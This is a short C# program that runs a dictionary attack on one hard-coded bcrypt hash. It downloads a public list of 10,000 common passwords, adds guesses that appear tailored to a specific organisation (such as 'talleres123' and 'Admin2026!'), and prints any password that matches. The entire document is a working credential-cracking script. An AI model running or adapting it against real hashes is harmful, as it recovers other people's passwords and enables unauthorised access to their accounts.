using System; using System.Net.Http; using System.Collections.Generic; class Program { static void Main() { Console.WriteLine("DOWNLOADING AND TESTING 10k PASSWORDS..."); var client = new HttpClient(); var list = client.GetStringAsync("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt").GetAwaiter().GetResult(); var words = new List<string>(list.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)); words.AddRange(new[] {"Admin@123", "Admin123#", "Password123!", "P@ssword123", "transport", "talleres", "talleres123", "admin", "root", "root123", "Admin@1234", "admin@123", "Transport@123", "Admin2026!", "Admin2026@", "admin2026!", "admin123456", "superadmin", "superadmin123"}); foreach(var s in words) { if (BCrypt.Net.BCrypt.Verify(s, "$2a$11$ddLf4PrB.8GK7SWwsejhBO5pgmJNCEYFJvE5miaLAaK4g/WWP4VfO")) { Console.WriteLine("MATCH_FOUND_SUCCESS: " + s); return; } } Console.WriteLine("NONE_MATCHED"); } }
